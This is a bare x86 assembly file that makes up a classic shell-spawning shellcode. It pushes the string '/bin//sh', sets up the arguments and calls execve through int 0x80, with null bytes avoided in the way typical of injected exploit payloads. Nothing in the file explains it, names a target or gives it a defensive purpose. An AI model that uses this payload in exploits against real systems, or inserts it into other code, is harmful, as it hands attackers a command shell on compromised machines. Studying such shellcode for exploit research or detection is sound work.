.globl _main

_main:
	xorl	%eax,%eax    
	pushl	%eax        
	pushl	$0x68732f2f 
	pushl	$0x6e69622f 
	movl	%esp,%ebx    
	pushl	%eax        
	pushl	%esp        
	pushl	%ebx        
	pushl	%eax        
	movb	$0x3b,%al    
	int	$0x80         
	
	call _exit
